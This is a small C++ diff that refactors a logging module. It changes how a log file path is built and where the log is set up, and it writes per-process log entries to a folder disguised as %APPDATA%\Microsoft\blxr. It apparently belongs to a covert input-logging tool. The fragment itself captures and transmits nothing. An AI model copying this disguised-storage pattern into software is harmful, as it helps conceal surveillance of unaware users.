@@ -2,12 +2,10 @@
 #include <iostream>
 
 #define APPDATA "APPDATA"
-#define LOG_FILE_NAME "blxrlog.txt"
 
-// TODO Doesn't work when not initialized on declaration
-stream::LogFile *log_file = new stream::LogFile(stream::GetPath("\\Microsoft\\blxr", true), LOG_FILE_NAME);
+stream::LogFile *log_file;
 
-std::string stream::GetPath(const std::string &dir, const bool append) {
+std::string stream::GetPath(const std::string &dir) {
   char *buf = nullptr;
   size_t size = 0;
   std::string final_dir;
@@ -16,9 +14,6 @@ std::string stream::GetPath(const std::string &dir, const bool append) {
 	final_dir = buf;
   }
   final_dir += dir;
-  if (append) {
-	final_dir += "\\";
-  }
   free(buf);
   return final_dir;
 }
@@ -30,6 +25,7 @@ bool stream::MakeDir(const std::string &path) {
 
 bool stream::WriteLog(const std::string &input, uint32_t &active, const bool block_process_info) {
   bool process_info = false;
+  log_file->SetupFile(GetPath(R"(\Microsoft\blxr\)"), "blxr.txt");
   uint32_t cur = system_data::GetProcessId();
   if (system_data::ProcessChanged(active, cur, true)) {
 	process_info = true;
